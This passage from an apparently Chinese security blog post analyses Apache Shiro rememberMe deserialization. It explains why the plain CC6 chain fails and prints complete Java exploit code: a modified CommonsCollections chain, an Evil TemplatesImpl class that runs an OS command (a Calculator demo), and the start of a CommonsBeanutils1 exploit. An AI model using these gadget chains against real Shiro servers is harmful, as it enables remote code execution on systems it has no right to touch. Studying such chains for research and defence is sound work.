class="hljs-keyword">javac </span>URLDNSEXP.<span class="hljs-keyword">java</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java </span>URLDNSEXP<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-07%20at%2021.26.19@2x.png"></p><p>然后将ser.bin文件拿到encrypt.py中执行AES 加密出来的编码替换包中的 RememberMe Cookie，将 JSESSIONID 删掉，因为当存在 JSESSIONID 时，会忽略 rememberMe，直接使用JSESSIONID做身份验证处理</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-07%20at%2021.25.08@2x.png"></p><p>查看dns监控网址是否收到请求，正常收到数据包发出来的请求，验证成功</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-07%20at%2021.26.02@2x.png"></p><h2 id="CC6链攻击shiro"><a href="#CC6链攻击shiro" class="headerlink" title="CC6链攻击shiro"></a>CC6链攻击shiro</h2><p>先说结论，单单用CC6是攻击不了的，具体原因写的比较清楚的可以参考这里<a href="https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#3-%E4%BD%BF%E7%94%A8-cc6-%E6%94%BB%E5%87%BB-shiro">CC6</a>，简单来说就是有一个数组加载不出来导致无法利用，这里我们也可以简单看一下，就不下断掉跟流程了</p><p>异常点在<code>org.apache.shiro.io.ClassResolvingObjectInputStream</code>，可以看到，这是一个 ObjectInputStream 的子类，其重写了 resolveClass 方法:</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2006.28.09@2x.png"></p><p><code>resolveClass</code> 是反序列化中用来查找类的方法，在读取序列化流的时候，读到一个字符串形式的类名，需要通过这个方法来找到对应的 <code>java.lang.Class</code> 对象。</p><p>找一下它的父类，也就是正常的 ObjectInputStream 类中的 <code>resolveClass</code> 方法，对比一下区别</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2006.30.48@2x.png"></p><p>注意到前者用的是<code>ClassUtils.forName</code>，原生用的是<code>Class.forName</code>，那么区别也就是在这里，对比一下两个forName的区别</p><p>关于断点跟进可以看刚才CC6那个链接，出异常时加载的类名为 <code>[Lorg.apache.commons.collections.Transformer;</code>。其实就是表示 <code>org.apache.commons.collections.Transformer</code> 的数组。</p><p>shiro自己重写的forName如下，看到是<code>loadClass</code>方法</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.09.30@2x.png" alt="CleanShot 2025-08-08 at 07.09.30@2x"></p><p>而原生的forName，用的是<code>ClassLoader.getClassLoader</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.11.16@2x.png" alt="CleanShot 2025-08-08 at 07.11.16@2x"></p><p>区别就是这两个的区别，你可以说是 <code>Class.forName()</code> 与 <code>ClassLoader.loadClass()</code> 的区别导致 shiro 反序列化时不能加载数组，这个原因不完全准确，较为准确的应该是：</p><p>shiro 加载 Class 最终调用的是 <code>Tomcat</code> 下的 <code>webappclassloader</code>，该类会使用 <code>Class.forName()</code> 加载数组类，但是使用的 classloader 是 <code>URLClassLoader</code>，只会加载 <code>tomcat/bin</code>、<code>tomcat/lib</code>、<code>jre/lib/ext</code> 下面的类数组，无法加载三方依赖 jar 包中的数组，也就是<code>loadClass</code>和<code>ClassLoader</code>对数组的处理方式的区别</p><p>也就是说，<strong>如果反序列化流中包含非 Java 自身的数组，则会出现无法加载类的错误</strong>。因为 CC6 用到了 <code>Transformer</code> 数组，所以加载失败，因此没法正常反序列化。</p><h2 id="改造CommonsCollections链攻击shiro"><a href="#改造CommonsCollections链攻击shiro" class="headerlink" title="改造CommonsCollections链攻击shiro"></a>改造CommonsCollections链攻击shiro</h2><blockquote><p>大概思路就是CC6的后半部分的利用链，通过templatesImpl将恶意对象传进来，然后创建一个用来调用 newTransformer 方法的 InvokerTransformer，通过TiedMapEntry对恶意对象调用newTransformer方法执行命令</p></blockquote><p>简单来说就是使用 <code>TemplatesImpl.newTransformer</code> 函数来动态 <code>loadClass</code> 构造好的<code>evil class bytes</code>。目的是为了不存在数组类型的对象而不会报错</p><p>CC中最常用的就是经过ConstantTransformer()将Runtime.class执行命令，但是可以看到CC1的利用链中，多层Transformer数组递归调用那么肯定会出现数组，所以这个方法肯定行不通的，需要想别的方法将我们的输入传进去</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.37.34@2x.png" alt="CleanShot 2025-08-08 at 07.37.34@2x"></p><p>那么CC6里给我们提供了另一种方法，从 <code>CommonsCollection6</code> 开始，用到了 <code>TiedMapEntry</code>，其作为中继，调用了 <code>LazyMap</code>（map）的 <code>get</code> 函数，那么我们可以利用这里</p><p>其中 <code>map</code> 和 <code>key</code> 都可以控制，而 <code>LazyMap.get</code> 调用了 <code>transform</code> 函数，并将可控的 <code>key</code> 传入 <code>transform</code> 函数：</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.45.51@2x.png" alt="CleanShot 2025-08-08 at 07.45.51@2x"></p><p>首先还是创建 TemplatesImpl 对象：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs csharp">TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-built_in">byte</span>[] code = Files.readAllBytes(Paths.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;Evil.class&quot;</span>));<br><span class="hljs-built_in">byte</span>[][] codes = &#123;code&#125;;<br>setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>setFieldValue(templates, <span class="hljs-string">&quot;_auxClasses&quot;</span>, <span class="hljs-literal">null</span>); <span class="hljs-comment">// 关键修复</span><br>setFieldValue(templates, <span class="hljs-string">&quot;_outputProperties&quot;</span>, <span class="hljs-literal">null</span>); <span class="hljs-comment">// 可选但推荐</span><br></code></pre></td></tr></table></figure><p>创建一个用来调用 newTransformer 方法的 InvokerTransformer，但注意的是，此时先传入一个正常的方法，比如 <code>getClass</code> ，避免恶意方法在构造 Gadget 的时候触发：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">InvokerTransformer invokerTransformer = <span class="hljs-built_in">new</span> InvokerTransformer(&quot;newTransformer&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Class</span>[]&#123;&#125;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&#125;);<br></code></pre></td></tr></table></figure><p>再把之前的 CommonsCollections6 的代码复制过来，将原来 TiedMapEntry 构造时的第二个参数 key，改为前面创建的 TemplatesImpl 对象：</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt; <span class="hljs-built_in">map</span> = <span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>&lt;&gt;();<br>Map&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt; lazyMap = LazyMap.<span class="hljs-property">decorate</span>(<span class="hljs-built_in">map</span>, invokerTransformer);<br>TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new </span><span class="hljs-class title_">TiedMapEntry</span>(lazyMap, templates);<span class="hljs-comment">// 传进来恶意类</span><br>BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new </span><span class="hljs-class title_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_">setFieldValue</span>(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, tiedMapEntry);<br></code></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiroexp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;Evil.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates, <span class="hljs-string">&quot;_auxClasses&quot;</span>, <span class="hljs-literal">null</span>); <span class="hljs-comment">// 关键修复</span><br>        setFieldValue(templates, <span class="hljs-string">&quot;_outputProperties&quot;</span>, <span class="hljs-literal">null</span>); <span class="hljs-comment">// 可选但推荐</span><br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, invokerTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, tiedMapEntry);<br><br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;shiro.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object fieldValue)</span><br>            <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, fieldValue);<br>    &#125;<br><span class="hljs-comment">//反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;shiro.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所用到的恶意Evil.java类代码如下，javac进行编译，注释中的是必须存在的东西否则会失败</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-comment">// 必须有无参构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        executePayload();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executePayload</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// macOS 弹出计算器命令</span><br>            String[] cmd = &#123;<br>                    <span class="hljs-string">&quot;/usr/bin/osascript&quot;</span>,<br>                    <span class="hljs-string">&quot;-e&quot;</span>,<br>                    <span class="hljs-string">&quot;tell application \&quot;Calculator\&quot; to activate&quot;</span><br>            &#125;;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-comment">// 静默处理异常</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须实现 transform 方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行shiroexp即可，这里需要注意的是包的处理问题，生成了shiro.bin再去跑我们的加密脚本即可得到payload</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2010.33.20@2x.png" alt="CleanShot 2025-08-08 at 10.33.20@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2010.41.53@2x.png" alt="CleanShot 2025-08-08 at 10.41.53@2x"></p><h2 id="CommonsBeanutils1-分析利用"><a href="#CommonsBeanutils1-分析利用" class="headerlink" title="CommonsBeanutils1 分析利用"></a>CommonsBeanutils1 分析利用</h2><p>因为原生shiro自己是不用到CommonsCollections依赖的，所以上方打CC链都是我们手动添加依赖进去（不过在某些特定情况下也是会存在CommonsCollections），如果是纯原生shiro的话就需要用CommonsBeanutils1来利用</p><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通 Java 类对象(也称为 <a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a>)的一些操作方法，相当于一个增强功能的依赖包，例如</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript">final <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name = <span class="hljs-string">&quot;catalina&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> name</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2015.53.51@2x.png" alt="CleanShot 2025-08-08 at 15.53.51@2x"></p><p>commons-beanutils 中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意 JavaBean 的 getter 方法，比如刚才的：<code>PropertyUtils.getProperty(person, &quot;name&quot;);</code></p><p>此时，<code>commons-beanutils</code> 会自动找到 name 属性的 getter 方法，也就是 getName，然后调用，获得返回值。除此之外， <code>PropertyUtils.getProperty</code> 还支持递归获取属性，比如 a 对象中有属性 b，b 对象中有属性 c，我们可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> 的方式进行递归获取。通过该方法，使用者可以很方便地调用任意对象的 getter，适用于在不确定 JavaBean 是哪个类对象时使用。</p><p>那么直接就在这个调用的地方打断点进去找一下可以利用的点，进入之后先是调了getProperty后再次调用了另一个对象的getProperty，继续跟进这个getProperty</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.03.54@2x.png" alt="CleanShot 2025-08-08 at 16.03.54@2x"></p><p>然后是这个方法<code>getNestedProperty</code>，进到这个方法看一下，一连串的判断，其实就是如果是Map、Index就进对应的方法，不是就到最后一个getSimpleProperty方法</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.12.22@2x.png" alt="CleanShot 2025-08-08 at 16.12.22@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.06.05@2x.png" alt="CleanShot 2025-08-08 at 16.06.05@2x"></p><p>可以看到从这里开始就已经实现getName方法，将我们传入的name转化为了对应的get方法，这段代码仔细看一下也就是实现了这个效果，那么到此就大概了解了流程</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.14.25@2x.png" alt="CleanShot 2025-08-08 at 16.14.25@2x"></p><p>那么既然可以将属性转化为对应的get方法，那么我们就想到了TemplatesImpl类中的getOutputProperties，这里调用了newTransformer().getOutputProperties()，我们知道newTransformer是可以动态加载而实现代码执行，那么就尝试利用这一点</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.29.16@2x.png" alt="CleanShot 2025-08-08 at 16.29.16@2x"></p><p>把刚才CommonsCollections的直接拿过来，是没问题的</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.42.54@2x.png" alt="CleanShot 2025-08-08 at 16.42.54@2x"></p><p>那么回到第一次调用getProperty的地方，也就是<code>org.apache.commons.beanutils.PropertyUtils#getProperty</code>方法，查找一下这个方法的用法，找一下可能反序列化的地方，定位到<code>org.apache.commons.beanutils.BeanComparator#compare</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2018.32.26@2x.png" alt="CleanShot 2025-08-08 at 18.32.26@2x"></p><p>这个方法传入两个对象，如果 <code>this.property</code> 为空，则直接比较这两个对象。如果 <code>this.property</code> 不为空，则用 <code>PropertyUtils.getProperty</code> 分别取这两个对象的 <code>this.property</code> 属性，比较属性的值。<code>PropertyUtils.getProperty</code> 这个方法会自动去调用一个 <code>JavaBean的getter</code> 方法， 这个点是任意代码执行的关键。</p><p>在分析 <code>TemplatesImpl</code> 利用链的文章中指出，<code>TemplatesImpl#getOutputProperties()</code> 方法是调用链上的一环，它的内部调用了 <code>TemplatesImpl#newTransformer()</code> ，也就是后面常用来执行恶意字节码的方法：</p><p>这里可以简单说一下为什么org.apache.commons.beanutils.BeanComparator#compare可以利用，CC2利用链中使用的是PriorityQueue优先队列里的跟踪</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.PriorityQueue</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#readObject</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#heapify</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#siftDownUsingComparator</span><br>java<span class="hljs-selector-class">.util</span>.Comparator#compare<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2018.44.30@2x.png" alt="CleanShot 2025-08-08 at 18.44.30@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2018.45.57@2x.png" alt="CleanShot 2025-08-08 at 18.45.57@2x"></p><p>那么跟进去TransformingComparator，你会发现compare调用了transformer.transform，那么就类似了，CC2这里能用那么CB这里能用也是一样的效果，也是从优先队列入手</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2018.47.15@2x.png" alt="CleanShot 2025-08-08 at 18.47.15@2x"></p><p>最终利用链为从优先队列PriorityQueue.readObject为入口</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PriorityQueue<span class="hljs-selector-class">.readObject</span><br>BeanComparator<span class="hljs-selector-class">.compare</span><br>PropertyUtils<span class="hljs-selector-class">.getProperty</span><br>TemplatesImpl<span class="hljs-selector-class">.getOutputProperties</span><br>TemplatesImpl<span class="hljs-selector-class">.newTransformer</span><br>defineClass.newInstance<br></code></pre></td></tr></table></figure><p>完整exp如下，恶意类依旧是上面的evil.class，这条链是不需要CommonsCollections依赖的，我把CommonsCollections依赖全移除掉，这是根据报错CB出现的问题修改后的exp，报错解决办法请看下方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 注释来自AI，仅供参考</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB1exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 创建TemplatesImpl对象用于加载恶意字节码</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        